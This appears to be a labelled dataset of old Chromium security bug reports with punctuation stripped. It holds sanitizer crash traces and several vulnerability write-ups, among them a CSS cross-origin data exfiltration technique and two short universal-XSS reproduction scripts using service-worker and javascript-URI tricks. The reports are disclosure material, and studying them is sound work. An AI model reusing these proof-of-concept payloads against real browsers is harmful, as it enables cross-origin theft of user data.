ppapipluginmain content mainfunctionparams const content/ppapi_plugin/ppapi_plugin_main.cc:141:3 44 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:310:14 45 in content contentmainrunnerimpl run content/app/content_main_runner.cc:788:12 46 in content contentmain content contentmainparams const content/app/content_main.cc:19:15 47 in chromemain chrome/app/chrome_main.cc:66:12 48 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 is located 104 bytes inside of 136-byte region freed by thread t0 chrome here 0 in operator delete void 0:0 1 in document dofielddelay cfx_widestring const int third_party/pdfium/fpdfsdk/src/javascript/document.cpp:1938:5 2 in setdelay third_party/pdfium/fpdfsdk/src/javascript/field.cpp:1307:4 3 in delay third_party/pdfium/fpdfsdk/src/javascript/field.cpp:1320:0 4 in void jspropsetter field field delay char const char const v8 local v8 string v8 local v8 value v8 propertycallbackinfo void const third_party/pdfium/fpdfsdk/src/javascript include/javascript/js_define.h:95:0 5 in v8 internal propertycallbackarguments call void v8 local v8 name v8 local v8 value v8 propertycallbackinfo void const v8 local v8 name v8 local v8 value v8/src/arguments.cc:89:1 6 in v8 internal object setpropertywithaccessor v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal handle v8 internal jsobject v8 internal handle v8 internal object v8 internal languagemode v8/src/objects.cc:377:5 7 in v8 internal object setpropertyinternal v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed bool v8/src/objects.cc:3201:16 8 in v8 internal object setproperty v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed v8/src/objects.cc:3247:7 9 in v8 internal storeic store v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal object storefromkeyed v8/src/ic/ic.cc:1632:3 10 in rt_impl_storeic_miss v8/src/ic/ic.cc:2470:3 11 in v8 internal storeic_miss int v8 internal object v8 internal isolate v8/src/ic/ic.cc:2461:0 9 unknown module 10 unknown module 11 unknown module 12 unknown module 12 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:128:9 13 in v8 script run v8 local v8 context v8/src/api.cc:1656:23 14 in js_execute v8 isolate ifxjs_context wchar_t const long fxjserr third_party/pdfium/fpdfsdk/src/jsapi/fxjs_v8.cpp:353:33 15 in cjs_context dojob int cfx_widestring const cfx_widestring third_party/pdfium/fpdfsdk/src/javascript/js_context.cpp:75:11 16 in cjs_context runscript cfx_widestring const cfx_widestring third_party/pdfium/fpdfsdk/src/javascript/js_context.cpp:114:9 17 in cpdfsdk_actionhandler runfieldjavascript cpdfsdk_document cpdf_formfield cpdf_aaction aactiontype pdfsdk_fieldaction cfx_widestring const third_party/pdfium/fpdfsdk/src/fsdk_actionhandler.cpp:670:17 18 in cpdfsdk_actionhandler doaction_fieldjavascript cpdf_action const cpdf_aaction aactiontype cpdfsdk_document cpdf_formfield pdfsdk_fieldaction third_party/pdfium/fpdfsdk/src/fsdk_actionhandler.cpp:84:4 19 in cpdfsdk_interform onvalidate cpdf_formfield cfx_widestring int third_party/pdfium/fpdfsdk/src/fsdk_baseform.cpp:2144:4 20 in cpdfsdk_interform beforevaluechange cpdf_formfield const cfx_widestring third_party/pdfium/fpdfsdk/src/fsdk_baseform.cpp:2506:4 21 in cpdf_formfield setvalue cfx_widestring const int int third_party/pdfium/core/src/fpdfdoc/doc_formfield.cpp:356:32 22 in field setvalue cpdfsdk_document cfx_widestring const int cjs_widestringarray const third_party/pdfium/fpdfsdk/src/javascript/field.cpp:3240:5 23 in document dofielddelay cfx_widestring const int third_party/pdfium/fpdfsdk/src/javascript/document.cpp:1937:5 24 in setdelay third_party/pdfium/fpdfsdk/src/javascript/field.cpp:1307:4 25 in delay third_party/pdfium/fpdfsdk/src/javascript/field.cpp:1320:0 26 in void jspropsetter field field delay char const char const v8 local v8 string v8 local v8 value v8 propertycallbackinfo void const third_party/pdfium/fpdfsdk/src/javascript include/javascript/js_define.h:95:0 27 in v8 internal propertycallbackarguments call void v8 local v8 name v8 local v8 value v8 propertycallbackinfo void const v8 local v8 name v8 local v8 value v8/src/arguments.cc:89:1 28 in v8 internal object setpropertywithaccessor v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal handle v8 internal jsobject v8 internal handle v8 internal object v8 internal languagemode v8/src/objects.cc:377:5 29 in v8 internal object setpropertyinternal v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed bool v8/src/objects.cc:3201:16 30 in v8 internal object setproperty v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed v8/src/objects.cc:3247:7 previously allocated by thread t0 chrome here 0 in operator new unsigned long 0:0 1 in field adddelay_widestringarray field_prop cjs_widestringarray const third_party/pdfium/fpdfsdk/src/javascript/field.cpp:3986:28 2 in field value ifxjs_context cjs_propvalue cfx_widestring third_party/pdfium/fpdfsdk/src/javascript/field.cpp:3100:4 3 in void jspropsetter field field value char const char const v8 local v8 string v8 local v8 value v8 propertycallbackinfo void const third_party/pdfium/fpdfsdk/src/javascript include/javascript/js_define.h:95:8 4 in v8 internal propertycallbackarguments call void v8 local v8 name v8 local v8 value v8 propertycallbackinfo void const v8 local v8 name v8 local v8 value v8/src/arguments.cc:89:1 5 in v8 internal object setpropertywithaccessor v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal handle v8 internal jsobject v8 internal handle v8 internal object v8 internal languagemode v8/src/objects.cc:377:5 6 in v8 internal object setpropertyinternal v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed bool v8/src/objects.cc:3201:16 7 in v8 internal object setproperty v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed v8/src/objects.cc:3247:7 8 in v8 internal storeic store v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal object storefromkeyed v8/src/ic/ic.cc:1632:3 9 in rt_impl_storeic_miss v8/src/ic/ic.cc:2470:3 10 in v8 internal storeic_miss int v8 internal object v8 internal isolate v8/src/ic/ic.cc:2461:0 10 unknown module 11 unknown module 12 unknown module 13 unknown module 14 unknown module 11 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:128:9 12 in v8 script run v8 local v8 context v8/src/api.cc:1656:23 13 in js_execute v8 isolate ifxjs_context wchar_t const long fxjserr third_party/pdfium/fpdfsdk/src/jsapi/fxjs_v8.cpp:353:33 14 in cjs_context dojob int cfx_widestring const cfx_widestring third_party/pdfium/fpdfsdk/src/javascript/js_context.cpp:75:11 15 in cjs_context runscript cfx_widestring const cfx_widestring third_party/pdfium/fpdfsdk/src/javascript/js_context.cpp:114:9 16 in runjsscript third_party/pdfium/fpdfsdk/src/javascript/app.cpp:682:3 17 in app timerproc cjs_timer third_party/pdfium/fpdfsdk/src/javascript/app.cpp:664:0 18 in cjs_timer timerproc int third_party/pdfium/fpdfsdk/src/javascript include/javascript/js_object.h:268:30 19 in chrome_pdf pdfiumengine oncallback int pdf/pdfium/pdfium_engine.cc:2426:3 20 in operator ppapi/utility/completion_callback_factory.h:605:9 21 in pp completioncallbackfactory chrome_pdf outofprocessinstance pp threadsafethreadtraits callbackdata pp completioncallbackfactory chrome_pdf outofprocessinstance pp threadsafethreadtraits dispatcher0 void chrome_pdf outofprocessinstance int thunk void int ppapi/utility/completion_callback_factory.h:582:0 22 in pp_runcompletioncallback ppapi/c/pp_completion_callback.h:240:3 23 in callwhileunlocked void pp_completioncallback int pp_completioncallback int ppapi/shared_impl/proxy_lock.h:134:0 24 in ppapi proxy anonymous namespace callbackwrapper pp_completioncallback int ppapi/proxy/ppb_core_proxy.cc:50:0 25 in run base/bind_internal.h:157:12 26 in makeitso base/bind_internal.h:293:0 27 in base internal invoker indexsequence 0ul 1ul base internal bindstate base internal runnableadapter void pp_completioncallback int void pp_completioncallback int base internal typelist pp_completioncallback int base internal typelist base internal unwraptraits pp_completioncallback base internal unwraptraits int base internal invokehelper false void base internal runnableadapter void pp_completioncallback int base internal typelist pp_completioncallback const int const void run base internal bindstatebase base/bind_internal.h:343:0 28 in run base/callback.h:396:12 29 in ppapi internal runwhilelockedhelper void callwhilelocked scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void ppapi/shared_impl/proxy_lock.h:198:0 30 in run base/bind_internal.h:157:12 31 in makeitso base/bind_internal.h:293:0 32 in base internal invoker indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void void scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal typelist base internal passedwrapper scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal invokehelper false void base internal runnableadapter void scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal typelist scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void void run base internal bindstatebase base/bind_internal.h:343:0 33 in run base/callback.h:396:12 34 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 35 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:444:3	7
security libexpat buffer-overflow seems to affect latest version of chromium on linux x86_64 vulnerability details recently mozilla fixed a buffer-overflow in expat chromium seems to be affected by that issue as well references advisory patch version chrome version 44.0.2398.0 dev 64-bit operating system fedora 21 fully updated reproduction case attached is the reproducer i dont have access to asan builds but normal builds show the aw snap window i can post asan tracebacks as soon as i am able to find where asan nightly builds are stored for crashes please include the following additional information reproducer attached	7
heap-use-after-free in blink frame deprecatedlocalowner tested on os ubuntu 14.04 chromium 45.0.2415.0 developer build 64-bit revision 2bd661311e3192357d72532c87b575bb0f37ae7b-refs/heads/master 331701 note the crash is reliable and without timing issues but it takes some time to trigger so clusterfuzz might have problems when reproducing this issue the free-stack has some gc frames so manually set gc sweeps in right positions could speed up the crash asan-trace 7702==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in blink frame deprecatedlocalowner const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/frame/frame.cpp:147:23 1 in blink frame ownerlayoutobject const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/frame/frame.cpp:274:10 2 in blink framecontentasplaintext unsigned long blink localframe wtf stringbuilder mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/web/weblocalframeimpl.cpp:276:41 3 in blink weblocalframeimpl contentastext unsigned long const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/web/weblocalframeimpl.cpp:1527:5 4 in chromerenderviewobserver capturetext blink webframe std 1 basic_string unsigned short base string16_char_traits std 1 allocator unsigned short mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release chrome/renderer/chrome_render_view_observer.cc:442:15 5 in chromerenderviewobserver capturepageinfo bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release chrome/renderer/chrome_render_view_observer.cc:416:3 is located 104 bytes inside of 200-byte region freed by thread t0 chrome here 0 in interceptor_free 0:0 1 in blink node removedlastref mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/node.cpp:2313:5 2 in blink treeshared blink node deref mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/treeshared.h:82:13 3 in v8 internal globalhandles pendingphantomcallback invoke v8 internal isolate mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/global-handles.cc:832:3 4 in v8 internal globalhandles dispatchpendingphantomcallbacks mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/global-handles.cc:814:5 5 in v8 internal globalhandles postgarbagecollectionprocessing v8 internal garbagecollector mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/global-handles.cc:848:18 previously allocated by thread t0 chrome here 0 in interceptor_malloc 0:0 1 in partitionalloc mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/partitionalloc.h:541:20 2 in blink node operator new unsigned long mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/node.cpp:118:0 3 in blink htmliframeelement create blink document mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/htmliframeelement.cpp:47:1 4 in blink iframeconstructor blink document blink htmlformelement bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/core/htmlelementfactory.cpp:613:12 5 in blink htmlelementfactory createhtmlelement wtf atomicstring const blink document blink htmlformelement bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/core/htmlelementfactory.cpp:1248:16 6 in blink document createelement blink qualifiedname const bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/document.cpp:1053:13	9
security xss auditor info disclosure using iframe length from different domains vulnerability details using contentwindow.length and when the filter uses block mode you can detect if the filter has blocked the page provided there is an existing iframe on the site you can inject fake xss payloads and use this detection technique to see if the content has been matched if a script block contains an user id or an email address you can inject a string that matches the script block e.g script uid 123 script somepage.php fakeinjection script 0auid 123 0a this will be blocked as an xss injection the uid can be bruteforced by injecting different combinations it is pretty slow but the next attack below is more effective as it can check if the string partially matches eduardo vela suggested i pad using existing param inside a form block i then produced a poc that can read a 32 character hash token_example.html thanks sirdarckcat the token example works by trying every character from 1-f i exclude 0 because this character is ignored by xss auditor if no match occurs for each of the characters i assume that the character is 0 if this sequence is repeated and no matches occur i then assume 2 0 s exist this enables me to steal a hash even if it contains zeros version chrome version 44.0.2403.30 beta-m operating system windows 7 sp1 reproduction case this one uses iframes onload bruteforces the value 123 this works using windows and checks if the email was blocked this one is pretty slow but shows how to do it x-domain even if a site has x-frame-options steal token example using existing filtered param and an existing form	9
security sop bypass of data exfiltration with css vulnerability details brief description webkit/blink allows a page to load any external resource as css and will interpret it even if its mime type is not correct this allows an attacker to exfiltrate data from cross-origin page via css string property injection with a couple of techniques the behavior had been discussed before issue 9877 1 and was patched later the fix that has been employed is to engage a stricter parsing mode when loading cross-origin resource with incorrect mime type in addition it is noticeable that setting the header x-content-type-options nosniff will not help browsers refrain from this behavior the whole process can be summarized as follow we can import any type of cross-origin resource as css and browsers will parse it when doing so a stricter parsing mode for css is engaged to stop potential attacks webkit/blink has adopted the so-called minimal enforcement 2 corresponds to stricter parsing mode as defense the idea of it is that the parser will stop parsing on the first syntactic error this is effective for most of the cases however there are still possibilities for this attack in extreme cases the attack limitations 3 are described below 1 insufficient injection points the attack requires two injection points pre-string and post-string 2 quotes data can not contain both single and double quotes 3 line breaks data can not contain line breaks besides the imported resource or at least the content before pre-string must be syntactically correct in css due to the patch consequently it is unfeasible to perform such an attack in real world scenarios unfortunately during my investigation i discovered a couple of techniques that can make the attack possible in many websites if we can control the charset of the target as utf-16 we can bypass most of the limitations as utf-16 maps two bytes into one character it wipes out all the ascii characters in a document ascii in utf-16 requires nul-byte as a result quotes and line breaks are eliminated corresponds to point 2 and 3 respectively moreover css allow unicode characters in range u+00a0 to u+10ffff as identifiers 4 which we can abuse to force the content of a document into valid css syntax we can even abuse the fact that blocks can be closed with eof-token 5 so that only one injection point is required to exfiltrate data corresponds to point 1 in fact if a page does not have charset configured in header it is highly vulnerable to the attack as we are allowed to decide its charset 6 the lack of charset in header is very common that it even exists in a google s service 7 to sum up there are two requirements to perform this attack the target does not have charset configured in header the injection point allows nul-byte this is common enough to be exploited in the wild what is even worse is that if the injection point appears in the first byte of the response body we can insert a bom to force the charset into utf-16 as it takes the highest precedence 6 when determining charset the fix is fairly simple browsers should refuse to load cross-origin resource as css if its mime type is incorrect indeed other browsers like internet explorer and firefox have adopted this approach 8 1 2 3 4 value-def-identifier 5 consume-a-simple-block0 6 input-byte-stream 7 8 version chrome version 37.0.2062.124 stable operating system 6.1 windows 7 windows server 2008 r2 reproduction case victim poc in this proof of concept the attack will be demonstrated to steal a token of a form there is an injection point in the page that is safe from normal xss attacks also note that they are cross-origin steps 1 open the victim page and check the token in the source code 2 open the poc 3 the extracted data will be shown in the page and the console the result should contain the token please let me know if you have any question i will try my best to explain everything	2
security spell checking dictionaries are fetched over http and large responses lead to a crash vulnerability details this bug is very similar but different to another that was worked recently this time the insecure url is used when downloading spell checking dictionaries the code that needs to be updated to use https is chromium/src/chrome/browser/spellchecker/spellcheck_hunspell_dictionary.cc l=217 an example insecure url that is used is the problem is that the insecure requests can be tampered with by an active network attacker to respond with a large response body which causes the chrome process to allocate large amounts of memory and/or crash with sigabrt here is an example of what happens on the command line when subject to an active network attack google-chrome incognito 5989:5989:0421/090853 error url_pattern_set.cc 240 invalid url pattern chrome print 5989:5989:0421/090854 error extension_downloader.cc 695 invalid url for extension gmlllbghnfkpflemihljekbapjopfjik tcmalloc large alloc 1073741824 bytes 5989:6024:0421/090915 fatal memory_linux.cc 43 out of memory aborted core dumped version chrome version 42.0.2311.90 stable operating system ubuntu 14.04.2 lts reproduction case 1 simulate needing to download a new language by removing existing dictionaries rm rf config/google-chrome/dictionaries 2 perform an active network attack that makes the request to respond with a 1gb response i generated a test file with dd if=/dev/zero of=gig bs=1m count=1024 3 now cause the browser to attempt to download the language there are a few ways of achieving this the most generic that i found was to a navigate to b right click the mouse in the main search entry text box doing so notices that the language needs to be downloaded and causes a crash my intuition says that this occurs because of a need to populate the spelling portion of the context menu although i did not verify that for crashes please include the following additional information type of crash entire browser sig abort crash state see screen shot and description above	4
security universal xss using navigator.serviceworker.ready vulnerability details from webkit/source/modules/serviceworkers/serviceworkercontainer.cpp scriptpromise serviceworkercontainer ready scriptstate callerstate if executioncontext return scriptpromise if m_ready m_ready createreadyproperty if m_provider m_provider getregistrationforready new getregistrationforreadycallback m_ready.get return m_ready promise callerstate world m_ready inherits the execution context of the serviceworkercontainer and that s the context associated with the navigator s frame when the container is created in navigatorserviceworker serviceworker the navigator object can be recreated with the frame holding a cross-origin window so the promise object created in the m_ready promise callerstate world call may end up using a wrong creation context version chrome 44.0.2403.155 stable chrome 45.0.2454.46 beta chrome 46.0.2486.0 dev chromium 46.0.2488.0 release build compiled today reproduction case script var i document.documentelement.appendchild document.createelement iframe var f frames 0 function i.onload function f return navigator serviceworker.ready.constructor.constructor alert location i.src script	2
security universal xss by loading a javascript uri from an unloaded window vulnerability details from webkit/source/core/frame/domwindow.cpp bool domwindow isinsecurescriptaccess localdomwindow callingwindow const string urlstring if protocolisjavascript urlstring return false if this domwindow is n't currently active in the frame then there s no way we should allow the access if iscurrentlydisplayedinframe fixme is there some way to eliminate the need for a separate callingwindow this check if callingwindow this return false fixme the name canaccess seems to be a roundabout way to ask can execute script can we name the securityorigin function better to make this more clear if callingwindow.frame securitycontext securityorigin canaccesschecksuborigins frame securitycontext securityorigin return false callingwindow.printerrormessage crossdomainaccesserrormessage callingwindow return true callingwindow may be an unloaded window whose associated frame holds another potentially cross-origin document as a result the security check can be bypassed version chrome 44.0.2403.157 stable chrome 45.0.2454.46 beta chrome 46.0.2486.0 dev chromium 47.0.2493.0 release build compiled today reproduction case script var i document.documentelement.appendchild document.createelement iframe var f frames 0 function i.onload function f location.replace javascript alert location i.src script	5
unknown in sksweepgradient sweepgradientcontext shadespan vulnerability details the attached testcase crashes the 64-bit of filter_fuzz_stub as follows 31860==error addresssanitizer segv on unknown address pc bp sp t0 0 in sksweepgradient sweepgradientcontext shadespan int int unsigned int int mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/effects/gradients/sksweepgradient.cpp:128 1 in skargb32_shader_blitter blitrect int int int int mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skblitter_argb32.cpp:448 2 in skscan fillirect skirect const skregion const skblitter mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skscan.cpp:43 3 in skscan fillrect skrect const skregion const skblitter mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skscan.cpp:61 4 in skscan fillrect skrect const skrasterclip const skblitter mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skscan.cpp:103 5 in skdraw drawrect skrect const skpaint const skmatrix const skrect const const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skdraw.cpp:875 6 in skbitmapdevice drawrect skdraw const skrect const skpaint const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skbitmapdevice.cpp:189 7 in skcanvas ondrawrect skrect const skpaint const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1856 8 in skrectshaderimagefilter onfilterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/effects/skrectshaderimagefilter.cpp:74 9 in skimagefilter filterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skimagefilter.cpp:189 10 in skcanvas internaldrawdevice skbasedevice int int skpaint const bool mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1233 11 in skcanvas internalrestore mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1098 12 in autodrawlooper autodrawlooper mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:402 13 in skcanvas internaldrawbitmap skbitmap const skmatrix const skpaint const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1208 14 in skcanvas ondrawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:2039 15 in skcanvas drawbitmap skbitmap const float float skpaint const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/skia/src/core/skcanvas.cpp:1753 16 in runtestcase mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:47 17 in readandruntestcase mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:66 18 in main mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:85 19 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 addresssanitizer can not provide additional info summary addresssanitizer segv home/nils/monkeychrome/asan-symbolized-linux-release-331246/filter_fuzz_stub 31860==aborting version chrome version asan-symbolized-linux-release-331246 operating system linux reproduction case attached as repro.fil	11
heap-use-after-free in weblocalframeimpl printbegin vulnerability details use after free bug happens in weblocalframeimpl printbegin of webkit/source/web/weblocalframeimpl.cpp file you have to open attached print.pdf file in a pdf editor to view javascript code which cause this bug document javascript section of print.pdf file has this code function printdoc this.print true app.settimeout printdoc 3000 document will print document action of print.pdf file has this code app.alert press ok or press escape key',3 similar bug issue 159165 version chrome version 45.0.2437.0 trunk build 44.0.2403.52 beta 43.0.2357.125 stable does not crash in official stable version for linux but does crash with asan release for same version operating system ubuntu 14.04 64 bit windows 8.1 64 bit reproduction case 1 open print.pdf with chrome 2 chrome will display print preview page and an alert dialog in 3 seconds 3 press ok on alert dialog or press escape key mimehandler process for pdf will crash for crashes please include the following additional information type of crash mimehandler process for pdf crash state address sanitizer output addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 chrome 0 in size third_party/webkit/source/wtf/vector.h:694:38 1 in wtf vector blink intrect 0ul wtf defaultallocator fill blink intrect const unsigned long third_party/webkit/source/wtf/vector.h:932:0 2 in blink chromepluginprintcontext computepagerects blink floatrect const float float float float third_party/webkit/source/web/weblocalframeimpl.cpp:511:9 3 in blink weblocalframeimpl printbegin blink webprintparams const blink webnode const third_party/webkit/source/web/weblocalframeimpl.cpp:1398:5 4 in printing prepareframeandviewforprint prepareframeandviewforprint printmsg_print_params const blink weblocalframe blink webnode const bool components/printing/renderer/print_web_view_helper.cc:650:5 5 in printing printwebviewhelper prepareframeforpreviewdocument components/printing/renderer/print_web_view_helper.cc:1100:30 6 in printing printwebviewhelper onprintpreview base dictionaryvalue const components/printing/renderer/print_web_view_helper.cc:1081:3 7 in dispatchtomethodimpl printing printwebviewhelper void printing printwebviewhelper const base dictionaryvalue base dictionaryvalue 0 base/tuple.h:254:3 8 in dispatchtomethod printing printwebviewhelper void printing printwebviewhelper const base dictionaryvalue base dictionaryvalue base/tuple.h:261:0 9 in dispatch printing printwebviewhelper printing printwebviewhelper void void printing printwebviewhelper const base dictionaryvalue components/printing/common/print_messages.h:343:0 10 in printing printwebviewhelper onmessagereceived ipc message const components/printing/renderer/print_web_view_helper.cc:894:0 11 in content renderviewimpl onmessagereceived ipc message const content/renderer/render_view_impl.cc:1289:9 12 in content messagerouter routemessage ipc message const content/common/message_router.cc:54:3 13 in content messagerouter onmessagereceived ipc message const content/common/message_router.cc:46:10 14 in content childthreadimpl onmessagereceived ipc message const content/child/child_thread_impl.cc:612:10 15 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:294:3 16 in run base/callback.h:396:12 17 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 18 in scheduler taskqueuemanager processtaskfromworkqueue unsigned long bool base pendingtask components/scheduler/child/task_queue_manager.cc:690:5 19 in scheduler taskqueuemanager dowork bool components/scheduler/child/task_queue_manager.cc:643:9 20 in run base/callback.h:396:12 21 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 22 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:458:3 23 in deferorrunpendingtask base/message_loop/message_loop.cc:468:5 24 in base messageloop dowork base/message_loop/message_loop.cc:580:0 25 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:34:21 26 in base runloop run base/run_loop.cc:55:3 27 in base messageloop run base/message_loop/message_loop.cc:286:3 28 in content renderermain content mainfunctionparams const content/renderer/renderer_main.cc:220:7 29 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:307:14 30 in content contentmainrunnerimpl run content/app/content_main_runner.cc:802:12 31 in content contentmain content contentmainparams const content/app/content_main.cc:19:15 32 in chromemain chrome/app/chrome_main.cc:66:12 33 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 is located 28 bytes inside of 128-byte region freed by thread t0 chrome here 0 in operator delete void 0:0 1 in deleteptr third_party/webkit/source/wtf/ownptrcommon.h:52:9 2 in operator third_party/webkit/source/wtf/ownptr.h:146:0 3 in blink weblocalframeimpl printbegin blink webprintparams const blink webnode const third_party/webkit/source/web/weblocalframeimpl.cpp:1391:0 4 in printing prepareframeandviewforprint prepareframeandviewforprint printmsg_print_params const blink weblocalframe blink webnode const bool components/printing/renderer/print_web_view_helper.cc:650:5 5 in printing printwebviewhelper prepareframeforpreviewdocument components/printing/renderer/print_web_view_helper.cc:1100:30 6 in printing printwebviewhelper onprintpreview base dictionaryvalue const components/printing/renderer/print_web_view_helper.cc:1081:3 7 in dispatchtomethodimpl printing printwebviewhelper void printing printwebviewhelper const base dictionaryvalue base dictionaryvalue 0 base/tuple.h:254:3 8 in dispatchtomethod printing printwebviewhelper void printing printwebviewhelper const base dictionaryvalue base dictionaryvalue base/tuple.h:261:0 9 in dispatch printing printwebviewhelper printing printwebviewhelper void void printing printwebviewhelper const base dictionaryvalue components/printing/common/print_messages.h:343:0 10 in printing printwebviewhelper onmessagereceived ipc message const components/printing/renderer/print_web_view_helper.cc:894:0 11 in content renderviewimpl onmessagereceived ipc message const content/renderer/render_view_impl.cc:1289:9 12 in content messagerouter routemessage ipc message const content/common/message_router.cc:54:3 13 in content messagerouter onmessagereceived ipc message const content/common/message_router.cc:46:10 14 in content childthreadimpl onmessagereceived ipc message const content/child/child_thread_impl.cc:612:10 15 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:294:3 16 in run base/callback.h:396:12 17 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 18 in scheduler taskqueuemanager processtaskfromworkqueue unsigned long bool base pendingtask components/scheduler/child/task_queue_manager.cc:690:5 19 in scheduler taskqueuemanager dowork bool components/scheduler/child/task_queue_manager.cc:643:9 20 in run base/callback.h:396:12 21 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 22 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:458:3 23 in deferorrunpendingtask base/message_loop/message_loop.cc:468:5 24 in base messageloop dowork base/message_loop/message_loop.cc:580:0 25 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:34:21 26 in base runloop run base/run_loop.cc:55:3 27 in base messageloop run base/message_loop/message_loop.cc:286:3 28 in ipc syncchannel waitforreplywithnestedmessageloop ipc syncchannel synccontext ipc/ipc_sync_channel.cc:555:5 29 in ipc syncchannel waitforreply ipc syncchannel synccontext base waitableevent ipc/ipc_sync_channel.cc:520:7 30 in ipc syncchannel send ipc message ipc/ipc_sync_channel.cc:494:3 31 in content childthreadimpl send ipc message 